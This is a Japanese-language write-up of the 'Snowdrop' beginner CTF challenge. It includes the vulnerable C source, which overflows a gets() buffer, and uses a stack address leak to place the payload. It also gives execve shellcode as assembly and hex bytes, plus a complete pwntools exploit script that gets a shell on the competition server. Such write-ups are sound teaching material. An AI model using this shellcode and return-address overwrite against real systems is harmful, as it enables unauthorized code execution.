# Snowdrop

## 問題
問題のソースコードは以下より
[https://github.com/SECCON/Beginners_CTF_2022](/gqNkjtumQHS_LFtKIkKanA)
<details><summary>ソースコード</summary>

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFF_SIZE 0x10

void show_stack(void*);

int main(void){
    char buf[BUFF_SIZE] = {0};
    show_stack(buf);
    puts("You can earn points by submitting the contents of flag.txt");
    puts("Did you understand?");
    gets(buf);
    puts("bye!");
    show_stack(buf);
}

void show_stack(void *ptr) {
    puts("stack dump...");
    printf("\n%-8s|%-20s\n", "[Index]", "[Value]");
    puts("========+===================");
    for (int i = 0; i < 8; i++) {
        unsigned long *p = &((unsigned long*)ptr)[i];
        printf(" %06d | 0x%016lx ", i, *p);
        if (p == ptr)
            printf(" <- buf");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE))
            printf(" <- saved rbp");
        if ((unsigned long)p == (unsigned long)(ptr + BUFF_SIZE + 0x8))
            printf(" <- saved ret addr");
        puts("");
    }
    puts("finish");
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
}
```

</details>
    
## 方針
ソースコード中に出てくるBUFF_SIZEやgets関数などを見るとバッファオーバーフロー攻撃が有効。NXが無効であることがchecksecより分かるのでスタックへのシェルコード挿入・実行が行える。
    
### STEP1　スタックのアドレスを特定
まずはバッファオーバーフロー攻撃でスタックを書き換えるにあたりgets関数の入力がどのスタックに入るのかを考えなくてはならない。
以下、プログラムをgdbで実行した結果の一部である。
```
stack dump...

[Index] |[Value]
========+===================
 000000 | 0x0000000000000000  <- buf
 000001 | 0x0000000000000000
 000002 | 0x0000000000404260  <- saved rbp
 000003 | 0x0000000000403a92  <- saved ret addr
 000004 | 0x0000000000000000
 000005 | 0x0000000100000000
 000006 | 0x00007fffffffe2a8
 000007 | 0x0000000000401905
                                 
```
                                 
ここから6番目の出力の値が明らかに他の数値と異なっていると分かる。gdbよりスタックのアドレスが漏洩しているとみられる。なお、このときのrspは0x7fffffffe040となっていた。 
**ちなみに、runやcontinueコマンドで同時に出てくるレジスタの値とinfo frameを実行したときのレジスタの値が異なっていたので注意。どうやら今回はinfo frameを実行したときの値が正確らしい。rspの始点と終点の違いかとも思ったが0x30も差が出るとは思えない。結局原因は不明。もしかしたら偶然計算が合ってしまっただけでまだ見落としている問題があるかもしれない。**

とりあえずrspのアドレスが分かったので漏洩しているアドレスからの差分を出しておく。
    0x00007fffffffe2a8　- 0x7fffffffe040 = 0x268
この計算の意味は、今後プログラムが実行されるたびに漏洩するアドレスが変わった場合にこの計算結果からrspのアドレスを割り出せるようにするためである。
                                 
### STEP2　シェルコードの作成
                                 
これはググれば出てくるので大会においては検索するのが最善かと思われる。以下に一応攻撃用シェルコードの作成法を記しておく。
        
今回の問題ソースコードにはsystem関数が存在しないため、
```
execve("/bin/sh",{"/bin/sh",NULL},NULL)
```
を実行するシェルコードが必要である。
まずは/bin/shをバイナリに直す。/bin/shをそのままバイナリに直すと 0x0068732f6e69622f となる。しかし、シェルコードにおいて/x00はコード終端を意味しその後のコードが読まれないので/bin//shとして/x00を回避する。（なお、この時のバイナリは 0x68732f2f6e69622f である。）
続いて、実行するコードを実際にシェルコードにする。参考サイトによると、
```
BITS 64
global _start
_start:
	xor rdx, rdx                ;rdx = 0
	push rdx                    ;"/bin//sh"の終端文字
	mov rax, 0x68732f2f6e69622f ;rax = "/bin//sh"
	push rax                    ;rsp = "/bin//sh"のアドレス
	mov rdi, rsp                ;rdi = "/bin//sh"のアドレス
	push rdx                    ;
	push rdi                    ;rsp = {"/bin//sh", NULL}
	mov rsi, rsp                ;rsi = {"/bin//sh", NULL}のアドレス
	lea rax, [rdx+59]           ;rax = 59
	syscall                　　;execve("/bin//sh", {"/bin//sh", NULL}, NULL)
```
となるらしい。これをobjdumpに渡すとこうなる。
```
0000000000401000 <_start>:
  401000:       48 31 d2                xor    rdx,rdx
  401003:       52                      push   rdx
  401004:       48 b8 2f 62 69 6e 2f    movabs rax,0x68732f2f6e69622f
  40100b:       2f 73 68
  40100e:       50                      push   rax
  40100f:       48 89 e7                mov    rdi,rsp
  401012:       52                      push   rdx
  401013:       57                      push   rdi
  401014:       48 89 e6                mov    rsi,rsp
  401017:       48 8d 42 3b             lea    rax,[rdx+0x3b]
  40101b:       0f 05                   syscall
```
この出力結果をもとに入力するシェルコードが完成。
```
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05
```
これは絶対本番は素直にネットで調べるほうがいいと感じた。

### STEP3　スタックバッファオーバーフロー
ここからは実際にスタック内に埋め込む方法を考える。
まず、スタック内の状態はrsp以下次のようになっている。
１：ユーザー入力　(0x10)
２：rbpのアドレス　(0x8)
３：リターンアドレス　(0x8)
この場合、１と２を適当な文字で埋めて、３にシェルコードの先頭のアドレス、３の後にシェルコードを積めればmain関数終了後にシェルコードが実行され、シェルを奪うことができる。ここでシェルコードの先頭のアドレスはrspから1,2,3の分だけ埋まっているので0x248だけ離れていることが分かる。なので漏洩していたアドレスから0x248を引いた値を渡せればよい。よって下のようなプログラムを組むとmain関数終了後にシェルがとれる。
```
import sys
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')

shellcode = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

def attack(conn, **kwargs):
    #saved_rbpの値を取得してstackのアドレスを特定
    conn.recvuntil(b'000006 | ')
    saved_rbp = conn.recv(18)
    print(saved_rbp)
    shellcode_addr = int(saved_rbp, 0) - 0x248 # 0x248はreturn addrとleaked addrの差分

    # buf1  = b'/bin/sh'.ljust(0x18, b'\00')
    buf1  = b'a'*0x18
    buf1 += pack(shellcode_addr)
    buf1 += shellcode

    conn.sendlineafter(b'understand?', buf1)


def main():
    conn = remote('snowdrop.quals.beginners.seccon.jp', 9002)
    # conn = process(bin_file)
#     conn = gdb.debug(bin_file, '''
#     break main
# ''')
    attack(conn)
    conn.interactive()


if __name__ == '__main__':
    main()
```

## 参考writeup
https://www.honamium.net/post/ctf4b_2022_writeup/
